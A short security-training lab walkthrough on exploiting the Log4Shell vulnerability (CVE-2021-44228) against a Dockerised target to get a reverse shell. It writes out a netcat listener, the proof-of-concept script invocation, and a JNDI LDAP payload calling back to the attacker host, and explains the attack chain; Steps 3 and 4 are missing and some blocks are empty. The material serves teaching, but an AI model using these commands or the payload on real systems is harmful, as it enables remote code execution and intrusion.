# Exercise 19: Exploiting Log4Shell (CVE-2021-44228)

## Objective
Exploit the **Log4j (Log4Shell)** vulnerability to obtain a **reverse shell** on the target server.

---

# Lab Setup

**Target**
- Ubuntu Machine
- Vulnerable Log4j Application

**Attacker**
- Parrot Security

---

# Step 1: Start Vulnerable Application

On Ubuntu:

```bash
docker run --network host log4j-shell-poc
```

**Purpose**
- Starts the vulnerable Log4j application on **port 8080**.

---

# Step 2: Verify the Target

Open Firefox on Parrot:

```text
http://192.168.0.19:8080
```

**Purpose**
- Verify the vulnerable application is running.

```bash
nc -lvp 9001
```

**Purpose**

Username:

```text

```

```text
anything
```

# Step 5: Generate Malicious Payload

Become root:

```bash
sudo su
```

Navigate to exploit directory:

```bash
cd log4j-shell-poc
```

Run the exploit:

```bash
python3 poc.py --userip 192.168.0.18 --webport 8000 --lport 9001
```

**Purpose**
- Starts:
  - LDAP Server
  - HTTP Server
- Generates a malicious JNDI payload.

Example output:

```text

${jndi:ldap://192.168.0.18:1389/a}
```

Copy the generated payload.

# How Log4Shell Works

1. User submits a malicious **JNDI payload**.
2. Log4j logs the Username.
3. Log4j interprets `${jndi:...}`.
4. Target contacts the attacker's LDAP server.
5. LDAP returns a malicious Java class.
6. Target downloads the class from the attacker's HTTP server.
7. The class executes on the target.
8. A reverse shell connects back to the attacker.

# Key Learning

- Log4Shell is **Remote Code Execution (RCE)** vulnerability.
- It abuses **JNDI lookups** performed by Log4j.
- Successful exploitation allows attackers to execute arbitrary code and obtain a reverse shell.
